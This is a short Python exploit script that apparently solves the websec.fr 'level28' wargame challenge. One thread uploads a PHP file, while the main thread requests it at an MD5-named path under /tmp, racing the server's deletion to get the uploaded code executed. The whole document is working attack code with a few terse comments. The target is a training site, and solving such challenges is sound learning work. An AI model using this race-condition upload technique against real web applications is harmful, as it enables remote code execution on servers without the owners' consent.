from time import sleep

import requests
import threading

HOST = "http://websec.fr/level28"

files = {'flag_file': open('flag.php','rb')}
data = {
    "checksum": "",
    "submit": "Upload and check",
}


def upload_malicious_file():
    requests.post(HOST+"/index.php", files=files, data=data)

# Upload malicious file in a new thread.
# This stores the php file on the server and waits for 1s until it is deleted.
threading.Thread(target=upload_malicious_file).start()

# Important: The md5 hash depends on your current IP!
sleep(0.5)
res = requests.post(HOST + "/tmp/897c2c4b6122a4bb64a190603b624fe0.php", files=files, data=data)
print(res.text)